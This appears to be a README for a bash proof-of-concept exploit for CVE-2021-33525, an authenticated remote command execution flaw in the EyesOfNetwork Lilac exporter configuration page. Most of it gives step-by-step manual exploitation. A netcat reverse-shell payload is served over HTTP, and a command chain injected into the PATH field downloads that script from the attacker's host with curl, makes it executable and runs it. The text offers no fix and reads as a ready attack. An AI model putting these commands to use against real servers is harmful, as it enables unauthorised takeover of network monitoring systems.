# LilacPathVUln
CVE-2021-33525
```
###############################################
#              (Authentified)                 #
#         Remote Commande Execution           #
#               EyesOfNetwork                 #
#                                             #
#      Impacted version * =/>  5.3.11         #
#               ...........                   #
#                                             #
#         Scripted on 05/22/2021              #
#              By ArianeBlow                  #
#                                             #
###############################################
```

The Eyes Of Network Lilac exporter configuration page contain a Remote Commande Execution vulnerability. 

The PoC's working fine, (sometime you must have to lunch the script twice ... It's juste a PoC in BASH right !

Can be abused manually :

Create a bash script for payload (exemple : nc -e /bin/sh LHOST LPORT) and start an http server in the same directory.

Go on EyesOfNetwork Lilac exporter config page : https://RHOST/lilac/export.php.

Create a new config and modify the "PATH" (at the end of the webpage) and put the commande afetr the original line like that for exemple : 
```
/srv/eyesofnetwork/nagios/bin/nagios -v /tmp/lilac-export-33/nagios.cfg && curl http://LHOST:LPORT/test.sh -o /tmp/lilac-export-2/test.sh && chmod +x /tmp/lilac-export-2/test.sh && cd /tmp/lilac-export-2/ && ./test.sh
```
Start your listener and lunch the export config.
Voila !
